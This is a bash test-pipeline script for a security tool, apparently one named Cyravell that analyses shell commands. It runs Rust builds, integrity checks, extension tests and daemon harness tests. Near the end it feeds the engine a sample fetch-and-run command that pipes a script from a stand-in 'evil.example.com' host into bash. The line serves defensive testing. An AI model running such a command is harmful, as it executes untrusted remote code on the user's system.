#!/usr/bin/env bash
# Copyright 2026 Cyravell Contributors
# SPDX-License-Identifier: Apache-2.0
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

export PATH="${HOME}/.cargo/bin:${PATH}"

echo "══════════════════════════════════════════════════════════════"
echo "              Running Cyravell Test Pipeline                   "
echo "══════════════════════════════════════════════════════════════"

# 1. Rust unit & subsystem tests
echo "[1/4] Building and running Rust unit and subsystem tests..."
cd "${ROOT_DIR}"
cargo build --workspace
cargo test --workspace -- --nocapture

# 2. Release integrity manifest verification test
echo ""
echo "[2/4] Testing release integrity verification against manifest..."
"${ROOT_DIR}/target/debug/cyravell-engine" verify-integrity \
  --manifest "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}"

# 3. Extension client tests
echo ""
echo "[3/4] Running VS Code extension client tests..."
cd "${ROOT_DIR}/vscode-extension"
node -e '
  const { EngineClient } = require("./out/engineClient");
  const assert = require("assert");
  const client = new EngineClient("/tmp/cyravell-test-nonexistent.sock");
  assert.strictEqual(client.getConnectionState(), "DISCONNECTED", "Client must initialize as DISCONNECTED");
  client.connect().then(connected => {
    assert.strictEqual(connected, false, "Must return false when engine is offline");
    assert.strictEqual(client.getConnectionState(), "DISCONNECTED", "State must remain DISCONNECTED");
    console.log("  ✓ Extension client disconnected-state verified");
  }).catch(e => { console.error(e); process.exit(1); });
'

# 4. End-to-end integration slice
echo ""
echo "[4/4] Running end-to-end vertical slice (Daemon + Test Harness)..."
TEST_TMP_DIR="$(mktemp -d /tmp/cyravell-e2e-XXXXXX)"
TEST_SOCK="${TEST_TMP_DIR}/test.sock"
TEST_DATA="${TEST_TMP_DIR}/data"
mkdir -p "${TEST_DATA}"

# Start engine in background with test parameters
"${ROOT_DIR}/target/debug/cyravell-engine" start \
  --socket-path "${TEST_SOCK}" \
  --data-dir "${TEST_DATA}" \
  --manifest-path "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}" > "${TEST_TMP_DIR}/engine.log" 2>&1 &
ENGINE_PID=$!

cleanup() {
  if kill -0 "${ENGINE_PID}" 2>/dev/null; then
    kill "${ENGINE_PID}" 2>/dev/null || true
  fi
  rm -rf "${TEST_TMP_DIR}"
}
trap cleanup EXIT

# Wait for socket readiness (up to 5s)
for i in {1..50}; do
  if [ -S "${TEST_SOCK}" ]; then
    break
  fi
  sleep 0.1
done

if [ ! -S "${TEST_SOCK}" ]; then
  echo "Error: Engine socket failed to start!"
  cat "${TEST_TMP_DIR}/engine.log"
  exit 1
fi

echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"

# Run the test harness suite against the live engine
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" run-suite

# Test Phase 2.1 complex chains and operator awareness
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-complex-chains

# Test invalid schema rejection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-invalid-schema

# Test oversized payload rejection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-oversized-payload

# Test audit tamper detection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-tamper-detection

# Verify the live engine audit log
"${ROOT_DIR}/target/debug/cyravell-engine" verify-audit --audit-file "${TEST_DATA}/audit.log"

# Clean shutdown
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" stop
wait "${ENGINE_PID}" 2>/dev/null || true

# Test standalone CLI command analysis
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "curl -sSL https://evil.example.com/sh | bash" > /dev/null
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "cargo test" > /dev/null

echo ""
echo "══════════════════════════════════════════════════════════════"
echo "  ✓ ALL CYRAVELL TESTS PASSED SUCCESSFULLY!"
echo "══════════════════════════════════════════════════════════════"
